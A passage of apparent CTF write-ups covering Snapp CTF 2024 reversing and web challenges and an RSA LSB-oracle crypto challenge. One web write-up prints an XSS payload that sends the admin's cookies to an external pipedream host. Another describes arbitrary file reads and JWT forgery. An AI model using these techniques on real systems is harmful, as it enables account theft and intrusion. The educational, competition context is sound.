unrecoverable.\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/blink/#solution","title":"Solution","text":"<p>After downloading the challenge files, I see there are many files:</p> <ul> <li>069b823.raw</li> <li>31b3f8b.raw</li> <li>4da6ff5.raw</li> <li>8e1f2bc.raw</li> <li>acd3730.raw</li> <li>ae329eb.raw</li> <li>f488e59.raw</li> <li>blink</li> </ul> <p>For the first step, I checked the blink file in the DIE (Detect It Easy) application to understand what type of executable it is:</p> <p></p> <p>As shown in the picture, It\u2019s an ELF Linux executable. I opened it in IDA but after seeing the graph, I decided to check it later. At that moment I preferred to understand the program interactively. The program just returns what we write in stdin after a null terminator byte. I checked the other files but suddenly, I noticed that those are like ASCII arts and they complete each other. I decide to cat all of the files and pipe the output to the blink program. Its output is:</p> <p></p> <p>Then I copied the output to an editor and the result was:</p> <p></p> <pre><code>____  _   _    _    ____  ____   ____  __  ___     _____  _ _   _     ____  _                 _     _____  _____   __  ___       ____       ____  _  _              ___  _ _       ___     _   _ _____ _____     _     ___   __  _____      _          ____        _  _       _____        ____      ___\n/ ___|| \\ | |  / \\  |  _ \\|  _ \\ / /  \\/  |/ _ \\ __|___  |(_) \\ | |   | ___|| |_ __ ___  _ __ | |   |___ / |_   _|__\\ \\/ / |_    / ___|  ___|  _ \\| || |  _ __ ___  ( _ )| / |_ __ / _ \\   | \\ | | ____|___ /  __| |   / _ \\ / _||___  | __ / \\   _ __ | ___| _ __ | || |  _ _|___ / _ __  / ___|   _| \\ \\\n\\___ \\|  \\| | / _ \\ | |_) | |_) | || |\\/| | | | / __| / / | |  \\| |   |___ \\| | '_ ` _ \\| '_ \\| |     |_ \\   | |/ _ \\\\  /| __|   \\___ \\ / __| |_) | || |_| '_ ` _ \\ / _ \\| | | '_ \\ (_) |  |  \\| |  _|   |_ \\ / _` |  | | | | |_    / / '__/ _ \\ | '_ \\|___ \\| '_ \\| || |_| '__||_ \\| '_ \\| |  | | | | || |\n ___) | |\\  |/ ___ \\|  __/|  __&lt; &lt; | |  | | |_| \\__ \\/ /  | | |\\  |    ___) |_| | | | | | |_) | |___ ___) |  | |  __//  \\| |_     ___) | (__|  _ &lt;|__   _| | | | | | (_) | | | | | \\__, |  | |\\  | |___ ___) | (_| |  | |_| |  _|  / /| | / ___ \\| | | |___) | |_) |__   _| |  ___) | | | | |__| |_| |_| &gt; &gt;\n|____/|_| \\_/_/   \\_\\_|   |_|   | ||_|  |_|\\___/|___/_/___|_|_| \\_|___|____/(_)_| |_| |_| .__/|_____|____/___|_|\\___/_/\\_\\\\__|___|____/ \\___|_| \\_\\  |_| |_| |_| |_|\\___/|_|_|_| |_| /_/___|_| \\_|_____|____/ \\__,_|___\\___/|_|___/_/ |_|/_/   \\_\\_| |_|____/| .__/   |_| |_| |____/|_| |_|\\____\\__, (_)| |\n                                 \\_\\                 |_____|     |_____|                |_|             |_____|             |_____|                                                   |_____|                     |_____|    |_____|                         |_|                                |___/  /_/\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/turnob/","title":"TurnOB","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/turnob/#turnob","title":"TurnOB","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/turnob/#description","title":"Description","text":"<pre><code>TurnOB, the elegant binary, covertly converts the input message to hexadecimal and discreetly prints the result, preserving its secrecy.\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/turnob/#solution","title":"Solution","text":"<p>After downloading, I checked the files and there are two files:</p> <ul> <li>turnob</li> <li>flag.enc</li> </ul> <p>In many CTFs, this scheme points to an encrypt/decrypt operation. There are many ways to reverse these challenges. First I decide to interact with the program itself except disassembly algorithms. For the first attempt, I decided to create a dictionary of printable letters (ASCII numbers) and the program output:</p> <pre><code>mapping = {\n    'a2:a7': '1', 'af:a7': '2', 'bc:a7': '3', 'c9:a7': '4', 'd6:a7': '5', 'e3:a7': '6', 'f0:a7': '7',\n    'fd:a7': '8', '0a:a7': '9', '95:a7': '0', '12:a7': 'a', '1f:a7': 'b', '2c:a7': 'c', '39:a7': 'd',\n    '46:a7': 'e', '53:a7': 'f', '60:a7': 'g', '6d:a7': 'h', '7a:a7': 'i', '87:a7': 'j', '94:a7': 'k',\n    'a1:a7': 'l', 'ae:a7': 'm', 'bb:a7': 'n', 'c8:a7': 'o', 'd5:a7': 'p', 'e2:a7': 'q', 'ef:a7': 'r',\n    'fc:a7': 's', '09:a7': 't', '16:a7': 'u', '23:a7': 'v', '30:a7': 'w', '3d:a7': 'x', '4a:a7': 'y',\n    '57:a7': 'z', '72:a7': 'A', '7f:a7': 'B', '8c:a7': 'C', '99:a7': 'D', 'a6:a7': 'E', 'b3:a7': 'F',\n    'c0:a7': 'G', 'cd:a7': 'H', 'da:a7': 'I', 'e7:a7': 'J', 'f4:a7': 'K', '01:a7': 'L', '0e:a7': 'M',\n    '1b:a7': 'N', '28:a7': 'O', '35:a7': 'P', '42:a7': 'Q', '4f:a7': 'R', '5c:a7': 'S', '69:a7': 'T',\n    '76:a7': 'U', '83:a7': 'V', '90:a7': 'W', '9d:a7': 'X', 'aa:a7': 'Y', 'b7:a7': 'Z', 'f8:a7': '_',\n    '6e:a7': '-', '64:a7': '{', '7e:a7': '}', 'd2:a7': '!'\n}\n</code></pre> <p>Then I tried to match them with the <code>flag.enc</code> content. Also for each key, there is a suffix of <code>a7</code> I decide to just add it to my mapping keys. The final code:</p> <pre><code>mapping = {\n    'a2:a7': '1', 'af:a7': '2', 'bc:a7': '3', 'c9:a7': '4', 'd6:a7': '5', 'e3:a7': '6', 'f0:a7': '7',\n    'fd:a7': '8', '0a:a7': '9', '95:a7': '0', '12:a7': 'a', '1f:a7': 'b', '2c:a7': 'c', '39:a7': 'd',\n    '46:a7': 'e', '53:a7': 'f', '60:a7': 'g', '6d:a7': 'h', '7a:a7': 'i', '87:a7': 'j', '94:a7': 'k',\n    'a1:a7': 'l', 'ae:a7': 'm', 'bb:a7': 'n', 'c8:a7': 'o', 'd5:a7': 'p', 'e2:a7': 'q', 'ef:a7': 'r',\n    'fc:a7': 's', '09:a7': 't', '16:a7': 'u', '23:a7': 'v', '30:a7': 'w', '3d:a7': 'x', '4a:a7': 'y',\n    '57:a7': 'z', '72:a7': 'A', '7f:a7': 'B', '8c:a7': 'C', '99:a7': 'D', 'a6:a7': 'E', 'b3:a7': 'F',\n    'c0:a7': 'G', 'cd:a7': 'H', 'da:a7': 'I', 'e7:a7': 'J', 'f4:a7': 'K', '01:a7': 'L', '0e:a7': 'M',\n    '1b:a7': 'N', '28:a7': 'O', '35:a7': 'P', '42:a7': 'Q', '4f:a7': 'R', '5c:a7': 'S', '69:a7': 'T',\n    '76:a7': 'U', '83:a7': 'V', '90:a7': 'W', '9d:a7': 'X', 'aa:a7': 'Y', 'b7:a7': 'Z', 'f8:a7': '_',\n    '6e:a7': '-', '64:a7': '{', '7e:a7': '}', 'd2:a7': '!'\n}\n\n# The encoded string\nprovided_string = \"5c:1b:72:35:35:64:5c:6d:95:ef:69:a6:d6:09:f8:6d:bc:9d:f8:99:16:0e:d5:f8:16:f0:7a:a1:d2:09:aa:f8:a2:bb:f8:8c:d2:7e:a7\"\n\n# Split the provided string into substrings of length 4\nsubstrings = provided_string.split(\":\")\ndecoded_string = ''.join(mapping.get(sub + \":a7\", \"*\") for sub in substrings)\nprint(decoded_string)\n</code></pre> <p>The result:</p> <p><code>SNAPP{Sh0rTE5t_h3X_DuMp_u7il!tY_1n_C!}</code></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/visits/","title":"Visits","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/visits/#visits","title":"Visits","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/visits/#description","title":"Description","text":"<pre><code>The origin of certain Windows binaries might not be Micro$oft Windows, posing a challenge when it comes to debugging them, like Vitis.\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/rev/visits/#solution","title":"Solution","text":"<p>After downloading the attachments, I checked the program in DIE (Detect it Easy) to have a better understanding of the executable type:</p> <p></p> <p>It was an unpacked dotnet file, so I opened it in the dnspy and the flag is exactly in front of my eyes:)))</p> <p></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/snapp_cat/","title":"Snapp cat","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/snapp_cat/#snapp-cat","title":"Snapp cat","text":"<p>First of all when we browse the given url we're faced with a swagger documentation.  I tried to call some of them but all seemed to require authentication except the register and login endpoints. So I tried the register endpoint and found out that the required phone number format is as follows: +123456789012 I registered an account using the required values and logged in to the application and got a authentication token. Afterwards, I tried to access /api/user/1 but it needed my email to be verified. I called the email verification and got the new email verified token. Then I called the /api/user/1 endpoint and it returned some information like username and phone number of admin. After that I called /api/user/login-with-phone endpoint with the Admin's phone number and it returned th sha256 hash of OTP. I cracked the hash and logged in as admin user. Now that I had the admin privilege I tried to access /api/cat/random-cat-image endpoint and it generated a uuid for me. Then I called /api/cat/create with random values and it showed me an error saying that an error has been occured in /app/index.js. I gave the /app/index.js as input to imagePath parameter and then tried to get the file from /api/cat/{catId}. It returned the base64 encoded index.js file. I noticed an endpoint like /secret and tried to call it but it didn't work. So I took a closer look and noticed that a claim should be set in my JWT that isn't set by default. So I took the JWT secret from index.js file and generated a new token with required property and called the secret endpoint again.  Finally I was awarded with the flag.</p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/snapp_cat/#solution","title":"Solution","text":"<ol> <li> <p>register </p> </li> <li> <p>login </p> </li> <li> <p>login with phone </p> </li> <li> <p>crack hash </p> </li> <li> <p>send login code </p> </li> <li> <p>email verification </p> </li> <li> <p>get verification code from session </p> </li> <li> <p>send email verification code </p> </li> <li> <p>get admin info </p> </li> <li> <p>login with admin phone </p> </li> <li> <p>crack admin login code </p> </li> <li> <p>send admin login code </p> </li> <li> <p>become admin </p> </li> <li> <p>random cat </p> </li> <li> <p>create cat with path /etc/passwd </p> </li> <li> <p>get data </p> </li> <li> <p>/etc/passwd data read </p> </li> <li> <p>get /app/index.js  </p> </li> </ol> <p>19 get flag with new jwt secret  </p> <pre><code>SNAPP{7dc998269394314896af6378f15c2c12}\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/snapp_fal/","title":"Snapp fal","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/snapp_fal/#snapp-fal","title":"Snapp fal","text":"<pre><code>From now on Snapp can offer you fals if you want.\n\n[Download attachments](https://snappctf.com/tasks/snappfal_0bfd799152fef7299463752d840c3225f64cb259.txz)\n\n**Notes for beginners**\n\n-[https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n\n-You need to get XSS on https://snappfal.spchallenge.ir/\n\n-When you got it, report your payload to https://snappfal-support.spchallenge.ir/\n\n-A virtual browser will visit your payload... flag is in the cookies of\u00a0`snappfal.spchallenge.ir`. Simply write a payload that steals\u00a0`document.cookie`\u00a0and submit the payload to\u00a0[https://snappfal-support.spchallenge.ir/](https://snappfal-support.spchallenge.ir/).\n\n-If your payload doesn't work on Admin bot, contact support.\n\n-Admin closes the browser after 5 seconds.\n\n-`src.js`\u00a0is the source code of the website.\n\n-`bot.js`\u00a0is the script that controls the virtual browser ( You can ignore it ).\n</code></pre> <p>when we visit the website we encounter a page like this</p> <p></p>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/snapp_fal/#solution","title":"Solution","text":"<p>if we click on the button it will be like this for a few seconds and the redirects us to previous page</p> <p> if wee look at the page source</p> <p></p> <p></p> <p>the input parameter back is for redirecting the user to an arbitrary page. so we can cause a dom-based XSS here by using javascript schema</p> <p></p> <p>the goal of the challenge is to read the flag which is inside admin's cookie</p> <p></p> <p>I used this payload to redirect admin back to my server containing it's cookie as query string</p> <pre><code>window.location=\"https://eowlxdv1oni96il.m.pipedream.net/?f=\"+document.cookie\n</code></pre> <p>and the finalized url is</p> <pre><code>https://snappfal.spchallenge.ir/fal?back=javascript:eval(atob(%27d2luZG93LmxvY2F0aW9uPSJodHRwczovL2Vvd2x4ZHYxb25pOTZpbC5tLnBpcGVkcmVhbS5uZXQvP2Y9Iitkb2N1bWVudC5jb29raWUK%27))\n</code></pre> <p></p> <pre><code>SNAPP{89d36f80b85bde916fbdeb8592c1b368}\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/welcome/","title":"welcome","text":""},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/welcome/#welcome","title":"Welcome","text":"<pre><code>Welcome to SnappCTF web hackers!!!\n\n[https://welcome.spchallenge.ir/](https://welcome.spchallenge.ir/)\n</code></pre>"},{"location":"CTF/writeups/2024/Snapp-ctf-2024/web/welcome/#solution","title":"Solution","text":"<p>The flag was separated in three parts - The first part is visible in the index - The second part is a comment in the index - The third part is a response header </p>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/","title":"Index","text":""},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/#result","title":"Result","text":"<p>We participated in HackTheBox Cyber Apocalypse 2025 CTF and ranked 71 out of 8,000 teams, which took us first place among Iranian teams.</p> <p>We had not participated in any CTF for about one year, and we were only six people, so we are satisfied with the results we achieved.</p> <p></p>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/#crypto","title":"Crypto","text":"<p>Twin Oracle</p>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/","title":"Twin Oracle","text":""},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#twin-oracle","title":"Twin Oracle","text":"Category Difficulty Score Crypto Hard 1000"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#code-description","title":"Code / Description","text":"<pre><code>A powerful artifact\u2014meant to generate chaos yet uphold order\u2014has \nrevealed its flaw. A misplaced rune, an unintended pattern, an \noversight in the design. The one who understands the rhythm of its \nmagic may predict its every move and use it against its creators. Will \nyou be the one to claim its secrets?\n</code></pre> <pre><code>from Crypto.Util.number import *\n\nFLAG = bytes_to_long(open('flag.txt', 'rb').read())\n\nMENU = '''\nThe Seers await your command:\n\n1. Request Knowledge from the Elders\n2. Consult the Seers of the Obsidian Tower\n3. Depart from the Sanctum\n'''\n\nclass ChaosRelic:\n    def __init__(self):\n        self.p = getPrime(8)\n        self.q = getPrime(8)\n        self.M = self.p * self.q\n        self.x0 = getPrime(15)\n        self.x = self.x0\n        print(f\"The Ancient Chaos Relic fuels the Seers' wisdom. Behold its power: M = {self.M}\")\n\n    def next_state(self):\n        self.x = pow(self.x, 2, self.M)\n\n    def get_bit(self):\n        self.next_state()\n        return self.extract_bit_from_state()\n\n    def extract_bit_from_state(self):\n        return self.x % 2\n\n\nclass ObsidianSeers:\n    def __init__(self, relic):\n        self.relic = relic\n        self.p = getPrime(512)\n        self.q = getPrime(512)\n        self.n = self.p * self.q\n        self.e = 65537 \n        self.phi = (self.p - 1) * (self.q - 1)\n        self.d = pow(self.e, -1, self.phi)\n\n    def sacred_encryption(self, m):\n        return pow(m, self.e, self.n)\n\n    def sacred_decryption(self, c):\n        return pow(c, self.d, self.n)\n\n    def HighSeerVision(self, c):\n        return int(self.sacred_decryption(c) &gt; self.n//2)\n\n    def FateSeerWhisper(self, c):\n        return self.sacred_decryption(c) % 2\n\n    def divine_prophecy(self, a_bit, c):\n        return self.FateSeerWhisper(c) if a_bit == 0 else self.HighSeerVision(c)\n\n    def consult_seers(self, c):\n        next_bit = self.relic.get_bit()\n        response = self.divine_prophecy(next_bit, c)\n        return response\n\n\n\ndef main():\n    print(\"You stand before the Seers of the Obsidian Tower. They alone hold the knowledge you seek.\")\n    print(\"But be warned\u2014no force in Eldoria can break their will, and their wisdom is safeguarded by the power of the Chaos Relic.\")\n    my_relic = ChaosRelic()\n    my_seers = ObsidianSeers(my_relic)\n    counter = 0\n\n    while counter &lt;= 1500:\n        print(MENU)\n        option = input('&gt; ')\n\n        if option == '1':\n            print(f\"The Elders grant you insight: n = {my_seers.n}\")\n            print(f\"The ancient script has been sealed: {my_seers.sacred_encryption(FLAG)}\")\n        elif option == '2':\n            ciphertext = int(input(\"Submit your encrypted scripture for the Seers' judgement: \"), 16)\n            print(f'The Seers whisper their answer: {my_seers.consult_seers(ciphertext)}')\n        elif option == '3':\n            print(\"The doors of the Sanctum close behind you. The Seers watch in silence as you depart.\")\n            break\n        else:\n            print(\"The Seers do not acknowledge your request.\")\n            continue\n\n        counter += 1\n\n    print(\"The stars fade, and the Seers retreat into silence. They shall speak no more tonight.\")\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#overview","title":"Overview","text":"<p>This challenge consists of several challenges</p> <ol> <li>Break a weakly implemented pseudorandom number generator (PRNG) to recover its seed</li> <li>Attack two different RSA oracles using side-channel attacks with two different strategies</li> <li>combine the two attacks to overcome the limit on the number of requests</li> </ol>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#challenge-analysis","title":"Challenge Analysis","text":"<p>First of all, let's analyze what the source code is doing.</p> <p>It has two classes, <code>ChaosRelic</code> and <code>ObsidianSeers</code>.</p> <ul> <li>Class <code>ChaosRelic</code></li> </ul> <pre><code>class ChaosRelic:\n    def __init__(self):\n        self.p = getPrime(8)\n        self.q = getPrime(8)\n        self.M = self.p * self.q\n        self.x0 = getPrime(15)\n        self.x = self.x0\n        print(f\"The Ancient Chaos Relic fuels the Seers' wisdom. Behold its power: M = {self.M}\")\n\n    def next_state(self):\n        self.x = pow(self.x, 2, self.M)\n\n    def get_bit(self):\n        self.next_state()\n        return self.extract_bit_from_state()\n\n    def extract_bit_from_state(self):\n        return self.x % 2\n</code></pre> <p>This class looks like a random number generator that starts with an initial state \\(x_0\\), and every time the state changes like this</p>  $x \\equiv x^2 \\mod M$  $M = p*q$  <p>M is a 16-bit composite number which is the multiplication of two 8-bit primes <code>p,q.</code> \u200cBecause M is in the form of \\(p*q\\), the x will not generate the entire group, and it will randomly generate some specific elements from the group and will cycle through them. This is quite similar to a random number generator. The M is public and is printed in the server banner below. But the x0 (the initial state) is unknown</p> <pre><code>You stand before the Seers of the Obsidian Tower. They alone hold the knowledge you seek.\nBut be warned\u2014no force in Eldoria can break their will, and their wisdom is safeguarded by the power of the Chaos Relic.\nThe Ancient Chaos Relic fuels the Seers' wisdom. Behold its power: M = 47897\n</code></pre> <ul> <li>Class ObsidianSeers</li> </ul> <pre><code>class ObsidianSeers:\n    def __init__(self, relic):\n        self.relic = relic\n        self.p = getPrime(512)\n        self.q = getPrime(512)\n        self.n = self.p * self.q\n        self.e = 65537 \n        self.phi = (self.p - 1) * (self.q - 1)\n        self.d = pow(self.e, -1, self.phi)\n\n    def sacred_encryption(self, m):\n        return pow(m, self.e, self.n)\n\n    def sacred_decryption(self, c):\n        return pow(c, self.d, self.n)\n\n    def HighSeerVision(self, c):\n        return int(self.sacred_decryption(c) &gt; self.n//2)\n\n    def FateSeerWhisper(self, c):\n        return self.sacred_decryption(c) % 2\n\n    def divine_prophecy(self, a_bit, c):\n        return self.FateSeerWhisper(c) if a_bit == 0 else self.HighSeerVision(c)\n\n    def consult_seers(self, c):\n        next_bit = self.relic.get_bit()\n        response = self.divine_prophecy(next_bit, c)\n        return response\n</code></pre> <p>\u064fThis class consists of implementing a 1024-bit RSA algorithm with a bunch of functions doing random stuff, which will be explored further.</p> <p>The main section of the code offers us three choices:</p> <pre><code>The Seers await your command:\n\n1. Request Knowledge from the Elders\n2. Consult the Seers of the Obsidian Tower\n3. Depart from the Sanctum\n</code></pre> <ul> <li>The third option is nothing but to quit the program</li> </ul> <pre><code>else:\n    print(\"The Seers do not acknowledge your request.\")\n    continue\n</code></pre> <ul> <li>By choosing the first one, the server will encrypt the flag and provide us with the public RSA modulus and the encrypted flag.</li> </ul> <pre><code>if option == '1':\n    print(f\"The Elders grant you insight: n = {my_seers.n}\")\n    print(f\"The ancient script has been sealed: {my_seers.sacred_encryption(FLAG)}\")\n</code></pre> <pre><code>The Seers await your command:\n\n1. Request Knowledge from the Elders\n2. Consult the Seers of the Obsidian Tower\n3. Depart from the Sanctum\n\n&gt; 1\nThe Elders grant you insight: n = 84223988112329788643315126478856298001964465223902564550457158504322548445551982946374719278491504704656043776095798840695185826964713620325457868836976247617788774865906426812535522263573890128765265912164329380552122731810918647455745367204862041691840856883985327365103112116603011698927744483206062728177\nThe ancient script has been sealed: 47694792918067833618743337085074169616387122847854183880922228123790116865360288170088204064193033596887527465969348968814544104147445017166395413765181640814259263450597744776172288013953900133905995520194649135666797777071440078060478319519681570941988003198237202426022625737178644671710688961046463818717\n</code></pre> <ul> <li>By choosing the second option, the server expects an encrypted text in hex format from us and will call the <code>consult_seers</code> function with our input.</li> </ul> <pre><code>elif option == '2':\n    ciphertext = int(input(\"Submit your encrypted scripture for the Seers' judgement: \"), 16)\n    print(f'The Seers whisper their answer: {my_seers.consult_seers(ciphertext)}')\n</code></pre> <p>Let's see what happens inside the function.</p> <pre><code>def consult_seers(self, c):\n    next_bit = self.relic.get_bit()\n    response = self.divine_prophecy(next_bit, c)\n    return response\n</code></pre> <p>This function is called the <code>get_bit</code> function of the <code>relic</code> instance, which is an instance of the <code>ChaosRelic</code> class that was explored before. Here is the get_bit function</p> <pre><code>def get_bit(self):\n    self.next_state()\n    return self.extract_bit_from_state()\n</code></pre> <p>It will simply call the next_state function, which will generate a new state from the previous state</p> <pre><code>def next_state(self):\n    self.x = pow(self.x, 2, self.M)\n</code></pre>  $state \\equiv state^2 \\mod M$  <p>Back to the <code>get_bit</code> function, this function calls another function named <code>extract_bit_from_state,</code> which will return the LSB(Least Significant bit) of the state simply by taking the state to modulus 2</p> <pre><code>def get_bit(self):\n    self.next_state()\n    return self.extract_bit_from_state()\n\ndef extract_bit_from_state(self):\n    return self.x % 2\n</code></pre> <p>Let's return to the first function, <code>consult_seers.</code> Overall, the first line will generate a new state and return whether it is even or odd.</p> <pre><code>def consult_seers(self, c):\n    next_bit = self.relic.get_bit()\n    response = self.divine_prophecy(next_bit, c)\n    return response\n</code></pre> <p>The next line will be called <code>divine_prophecy</code> with <code>next_bit</code> and the encrypted text <code>c,</code> which we have given to the server. Let's see what is happening inside the function</p> <pre><code>def HighSeerVision(self, c):\n    return int(self.sacred_decryption(c) &gt; self.n//2)\n\ndef FateSeerWhisper(self, c):\n    return self.sacred_decryption(c) % 2\n\ndef divine_prophecy(self, a_bit, c):\n    return self.FateSeerWhisper(c) if a_bit == 0 else self.HighSeerVision(c)\n</code></pre> <p>The following line will be called <code>divine_prophecy</code> with <code>next_bit</code> and the encrypted text <code>c,</code> which we have given to the server. Let's see what is happening inside the function</p> <p>The <code>FateSeerWhisper</code> will tell us whether the decryption of our provided cipher <code>c</code> is even or odd by taking to modulus 2. On the other hand, the <code>FateSeerWhisper</code> function will tell us whether the decryption of cipher message <code>c</code> is larger than half of the public modulus <code>n</code> or not.</p> <p>In a big picture, we can illustrate the overall process using this code:</p> <pre><code>c = input('hex format : ')\n\nif next_state() % 2 == 0: # if state is even\n    return decrypt(c) % 2\n    # returns 1 if decryption result ends in bit 1\n    # else returns 0\n\nelse: # if state is odd\n    return int(decrypt(c)) &gt; (n//2)\n    # returns 1 if result of decryption is greater than n/2\n    # else returns 0\n</code></pre> <p>As an example</p> <pre><code>You stand before the Seers of the Obsidian Tower. They alone hold the knowledge you seek.\nBut be warned\u2014no force in Eldoria can break their will, and their wisdom is safeguarded by the power of the Chaos Relic.\nThe Ancient Chaos Relic fuels the Seers' wisdom. Behold its power: M = 57121\n\nThe Seers await your command:\n\n1. Request Knowledge from the Elders\n2. Consult the Seers of the Obsidian Tower\n3. Depart from the Sanctum\n\n&gt; 2\nSubmit your encrypted scripture for the Seers' judgement: 1000\nThe Seers whisper their answer: 1\n</code></pre>"},{"location":"CTF/writeups/2025/Cyber-Apocalypse-2025/crypto/twin-oracle/#solution","title":"Solution","text":"<p>We can start explaining the solution now that we've realized what the code is doing. We are obviously facing an RSA oracle that expects ciphertext from the user and returns just a single bit (0 or 1). When the state is 0, the oracle returns the least significant bit of the decrypted text. There is already a known attack to recover an encrypted ciphertext from an RSA oracle that has such behaviors named Least Significant Bit Oracle Attack. There are already a lot of explanations about it around the internet, but I used this GitHub link and also this StackExchange link which has demonstrated it with example and also the python code.</p> <pre><code>e = 65537\nupper_limit = N\nlower_limit = 0\n\nflag = \"\"\ni = 1\n# for 1024 bit N\nwhile i &lt;= 1024:\n    chosen_ct = long_to_bytes((bytes_to_long(flag_enc)*pow(2**i, e, N)) % N)\n    output = _decrypt(chosen_ct)\n    if ord(output[-1]) == 0:\n        upper_limit = (upper_limit + lower_limit)/2\n    elif ord(output[-1]) == 1:\n        lower_limit = (lower_limit + upper_limit)/2\n    else:\n        throw Exception\n    i += 1\n\n# Decrypted ciphertext\nprint long_to_bytes(upper_limit)\n</code></pre> <p>If you want a detailed explanation of how this attack works, read through those links, but let's describe the overall algorithm.</p> <p>RSA has a fantastic property named Homomorphism. it means</p>  $f(x.y) = f(x).f(y)$  <p>Regarding RSA, imagine we have two messages: \\(m_1\\) and \\(m_2\\). By definition, we can write:</p>  $E(m1*m2) = E(m1).E(m2)$  <p>Consider \\(c\\) as the encryption of \\(m=m1*m2\\) and \\(c_i\\) as encryption of \\(m_i\\) for \\(i={1,2}\\). We can write</p>  $c_1 \\equiv (m_1)^e \\mod n$  $c_2 \\equiv (m_2)^e \\mod n$  $c \\equiv (m_1*m_2)^e = (m)^e \\mod n$  $c \\equiv c1 * c2 \\mod n$  <p>Consider we want to decrypt the encrypted <code>flag</code>, which has been encrypted.</p>  $cf \\equiv flag^e \\mod N$  <p>Let's analyze this approach.</p> <p>Encrypt <code>2</code> by the public key <code>n,e</code>, which is known, and multiply the result by cf modulus N and name the result ct</p>  $ct \\equiv cf * 2^e \\mod N$  <p>By Homomorphism, we know that once the <code>ct</code> is decrypted, it will result in \\(2*flag\\). We know that <code>n</code> is odd, and if \\(2*flag\\) is less than <code>n</code>, it will result in \\(2*flag\\), which is definitely even and will return 0, but if \\(2*flag\\) is greater than <code>n</code>, it will result in  \\(2*flag - N\\) which is odd (even - odd = odd). The result will be </p> <p>so we send \\(2M\\) to the server:</p> <ol> <li>if the result is 0, then \\(M &lt; N/2\\) </li> <li>if the result is 1, then \\(M &gt; N/2\\) </li> </ol> <p>Like \\(2M\\), let's see how the server reacts for \\(4M\\)</p> <p>we send \\(2M\\) then \\(4M\\) and based upon server behaviour</p> <ol> <li>if the result is 0,0 then \\(M &lt; N/2\\) and \\(M &lt; N/4\\)</li> <li>if the result is 0,1 then \\(M &lt; N/2\\) and \\(M &gt; N/4\\)</li> <li>if the result is 1,0 then \\(M &gt; N/2\\) and \\(M &lt; 3N/4\\)</li> <li>if the result is 1,1 then \\(M &gt; N/2\\) and \\(M &gt; 3N/4\\)</li> </ol> <p>If we continue to raise the coefficients like \\(2M, 4M, 8M, 16M, ...\\), we can limit the boundaries for M until we reach a specific value for M, which is actually the decrypted plaintext. It looks like some form of binary search to find M, and it will done in \\(O(\\log{n})\\).</p> <p>I recommend reading the StackExchange link, which has more details to explain.</p> <p>Now we know we have an Oracle that is vulnerable to an LSB Oracle attack. But there is a problem. Getting back to the code, we have two different oracles. The other one has different behaviors, and our input flows through each of them based on the state, which is random and unknown. Therefore, to overcome this problem, we must first get the initial value of our random number generator. Due to its small size (16-bit), we can ensure that the cycling group generated by the state is not that large.</p> <p>To find out the initial state, we need to give a carefully crafted input that will be directed to the second oracle, which checks whether the decryption result is greater than \\(n/2\\). Let's say we send this encrypted text to the server</p>  $cf \\equiv (N-1)^e \\mod N$  <p>After sending this input to the server, let's see what will happen in different states</p>  $cf^d \\equiv N-1 \\mod N$  <pre><code>c = input('hex format : ')\n\nif next_state() % 2 == 0: # if state is even\n    return decrypt(c) % 2\n    # returns 1 if decryption result ends in bit 1\n    # else returns 0\n\nelse: # if state is odd\n    return int(decrypt(c)) &gt; (n//2)\n    # returns 1 if result of decryption is greater than n/2\n    # else returns 0\n</code></pre> <ol> <li>if next_state() is even or (state % 2) is <code>0</code>: we know that N-1 is even so it will return <code>0</code> </li> <li>if next_state() is odd or (state % 2) is <code>1</code>: we know that N-1 is greater than \\(n/2\\) so it will return <code>1</code></li> </ol> <p>It is clear that this special input will return 0 if the state is even and 1 if the state ID is odd. </p> <p>So we can get enough sequences of \\({0,1}\\) from the server by this special input and determine the initial state. To do so, we will generate all possible states of every prime number between \\(2^14\\) and \\(2^15\\) (all 15-bit prime numbers) and check the received pattern from the oracle to match which number includes the same pattern. We will determine the initial state, which acts as the seed of our random number generator, and will finally break the weakly implemented PRNG</p> <p>Here is the implemented code to recover the server's initial state:</p> <pre><code>def gen_patterns(M):\n\n    patterns = {}\n    for i in range(2**14, 2**15):\n\n        if isPrime(i):\n            x = i\n            patterns[i] = []\n            gens = [x]\n            counter = 0\n\n            while counter &lt; 1000:\n                x = pow(x, 2, M)\n                if not (x in gens):\n                    counter = 0\n                    gens.append(x)\n\n                counter += 1\n\n            for g in gens:\n                patterns[i].append(g % 2)\n    return patterns\n\n\ndef get_state(sock, patterns, n, c):\n\n    global counter\n\n    index = 0\n    copy = patterns.copy()\n\n\n    while len(patterns) != 1 and counter &lt; 30:\n\n        counter += 1\n        ct = 0\n        ct = pow(n-1, 0x10001, n)\n\n        sock.sendall(b'2\\n')\n        recvall(sock, 4096)\n        sock.sendall(f'{hex(ct)[2:]}\\n'.encode())\n        data = recvall(sock, 4096).decode()\n\n        index += 1\n        parity = 